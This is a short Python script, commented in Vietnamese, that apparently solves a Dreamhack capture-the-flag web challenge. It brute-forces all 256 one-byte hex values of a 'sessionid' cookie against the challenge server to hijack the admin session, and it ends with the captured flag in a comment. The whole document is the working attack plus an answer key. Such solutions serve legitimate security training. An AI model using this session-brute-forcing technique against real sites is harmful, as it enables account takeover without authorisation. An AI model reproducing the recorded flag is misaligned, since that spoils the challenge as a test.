import requests

# Thay đổi URL nếu cần
URL = "http://host8.dreamhack.games:12211/"

# Vòng lặp để thử tất cả 256 khả năng
# i sẽ chạy từ 0 đến 255
for i in range(256):
    # Chuyển số i sang dạng hex, xóa tiền tố "0x", và đệm số 0 vào đầu nếu cần để đủ 2 ký tự
    # Ví dụ: 10 -> "0a", 15 -> "0f", 255 -> "ff"
    session_id = hex(i)[2:].zfill(2)
    
    # Tạo cookie
    cookies = {
        "sessionid": session_id
    }
    
    # Gửi request với cookie đã được giả mạo
    response = requests.get(URL, cookies=cookies)
    
    # In ra để theo dõi tiến trình
    print(f"[*] Trying sessionid: {session_id}")
    
    # Kiểm tra xem trong nội dung trả về có chữ "flag" không
    # Nếu có, chúng ta đã tìm thấy session của admin
    if "flag is" in response.text:
        print(f"\n[+] Found Admin Session ID: {session_id}")
        print(f"[+] Flag Response:\n{response.text}")
        break # Dừng lại khi đã tìm thấy
    
# Flag: DH{73b3a0ebf47fd6f68ce623853c1d4f138ad91712}